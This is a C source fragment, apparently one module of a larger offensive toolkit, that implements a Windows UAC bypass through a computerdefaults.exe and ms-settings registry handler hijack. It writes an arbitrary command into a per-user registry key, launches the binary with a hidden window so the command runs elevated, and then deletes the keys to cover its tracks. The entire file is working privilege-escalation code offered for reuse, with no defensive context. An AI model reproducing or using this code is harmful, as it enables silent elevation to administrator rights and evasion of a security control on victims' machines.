// chunk: privesc/uac_computerdefaults
// depends: (none)
// provides: uac_bypass_computerdefaults
// note: UAC bypass via computerdefaults.exe — ms-settings handler hijack

#ifndef CHUNK_PRIVESC_UAC_COMPUTERDEFAULTS
#define CHUNK_PRIVESC_UAC_COMPUTERDEFAULTS

static int uac_bypass_computerdefaults(const char *cmd_to_run) {
    HKEY hKey;
    const char *keyPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";

    if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
                        &hKey, NULL) != ERROR_SUCCESS) {
        return 0;
    }

    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmd_to_run, (DWORD)strlen(cmd_to_run) + 1);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "open";
    sei.lpFile = "C:\\Windows\\System32\\computerdefaults.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    BOOL result = ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

    return result ? 1 : 0;
}

#endif
